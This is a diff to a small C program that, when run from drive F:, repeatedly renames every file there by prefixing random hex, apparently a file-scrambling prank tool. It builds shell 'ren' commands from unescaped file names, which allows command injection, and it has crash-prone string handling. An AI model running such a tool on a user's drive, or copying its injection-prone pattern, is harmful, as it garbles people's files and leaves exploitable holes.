@@ -9,18 +9,24 @@ char HEX_VALUES[] = "0123456789ABCDEF";
 void renameFile(char* file_name);
 char* getRandomHex(int);
 
+char* programName;
+
 int main(int argc, char* argv[])
 {
+    int programName_length = strlen(argv[0]);
+    programName = malloc(programName_length + 1);
+    strncpy(programName, argv[0], programName_length);
+
     char workingDirectory[150];
     
-    system("pwd > out");
+    system("cd > out");
 
     FILE *outputFile;
     outputFile = fopen("out", "r");
     fgets(workingDirectory, 150, outputFile);
     fclose(outputFile);
 
-    system("ls -1 > out");
+    system("dir /B > out");
 
     outputFile = fopen("out", "r");
 
@@ -31,7 +37,7 @@ int main(int argc, char* argv[])
 
     for (int i = 0;; i++)
     {
-        if (fgets(buffer, 150, outputFile) == NULL)
+        if (strcmp(fgets(buffer, 150, outputFile), "") == 0)
             break;
         strcpy(files[i], buffer);
         fileCount++;
@@ -46,7 +52,7 @@ int main(int argc, char* argv[])
     //     printf(files[i]);
     // }
 
-    if (strcmp(workingDirectory, "F:\\") == 0 || strcmp(workingDirectory, "F:\\\n") == 0)
+    if (strncmp(workingDirectory, "F:\\", 3) == 0)
     {
     start:
         for (int i = 0; i < fileCount; i++)
@@ -66,6 +72,8 @@ int main(int argc, char* argv[])
             goto start;
     }
 
+    free(programName);
+
     return 0;
 }
 
@@ -80,14 +88,12 @@ void renameFile(char* file_name)
     }
     
     if (
-        strcmp(file_name, "del.exe") == 0 || 
-        strcmp(file_name, "del.c") == 0 || 
-        strcmp(file_name, "") == 0 || 
-        strcmp(file_name, "out") == 0
+        strcmp(file_name, programName) == 0 || 
+        strcmp(file_name, "shuffler.c") == 0 || 
+        strcmp(file_name, "") == 0
     )
-    {
         return;
-    }
+
 
     char* hex_value = getRandomHex(HEX_LENGTH);
 
@@ -95,6 +101,8 @@ void renameFile(char* file_name)
     snprintf(renameCommand, sizeof(renameCommand), "ren \"%s\" \"%s %s\"", file_name, hex_value, file_name);
     printf("%s\n", renameCommand);
     system(renameCommand);
+
+    free(hex_value);
 }
 
 char* getRandomHex(int length)
